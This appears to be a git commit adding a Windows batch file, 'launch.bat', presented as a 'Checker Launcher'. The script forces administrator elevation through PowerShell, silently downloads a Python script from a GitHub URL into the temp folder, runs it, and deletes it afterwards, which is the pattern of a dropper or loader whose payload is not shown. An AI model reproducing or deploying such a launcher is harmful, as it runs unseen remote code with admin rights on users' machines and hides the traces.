bfae2ed5c9ae0d240f2e88cef2c4825677def36f
ddd <radmirkaghoul1007@icloud.com>
2026-01-28 16:19:02 +0500

    Add files via upload

---
+++ launch.bat
@@ -0,0 +1,30 @@
+@echo off
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    goto :run_script
+) else (
+    echo [!] Нужны права админа...
+    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
+    exit /b
+)
+
+:run_script
+title Checker Launcher
+cls
+
+set "URL=https://github.com/Ftnzz1337/13.37-checkr/main/main.py"
+set "DEST=%TEMP%\checker_v3.py"
+
+echo [+] Downloading script...
+curl -s -L -o "%DEST%" "%URL%"
+
+if exist "%DEST%" (
+    echo [+] Running...
+    python "%DEST%"
+) else (
+    echo [!] error
+    pause
+)
+
+del "%DEST%" >nul 2>&1
+exit
